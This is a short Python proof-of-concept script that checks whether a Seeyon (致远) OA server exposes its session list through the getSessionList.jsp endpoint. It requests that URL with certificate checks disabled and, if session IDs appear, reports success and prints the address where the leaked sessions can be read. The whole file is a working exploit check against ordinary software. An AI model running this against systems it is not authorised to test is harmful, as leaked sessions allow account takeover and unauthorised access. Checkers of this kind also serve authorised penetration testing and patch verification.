import time
import requests

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    vuln_url = target_url + "yyoa/ext/https/getSessionList.jsp?cmd=getAll"
    success_msg = now_time() + '[SUCCESS]目标存在致远OA getSessionList.jsp Session泄漏漏洞'
    shell_msg = now_time() + 'Session地址: {} '.format(vuln_url)
    warning_msg = now_time() + '[WARNING]不存在致远OA getSessionList.jsp Session泄漏漏洞'
    error_msg = now_time() + '[致远OA getSessionList.jsp Session泄漏漏洞][ERROR]目标请求失败'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "/yyoa/index.jsp" not in response.text and "<sessionID>" in response.text and response.status_code == 200:
            return success_msg,shell_msg
        else:
            return warning_msg
    except:
        return error_msg


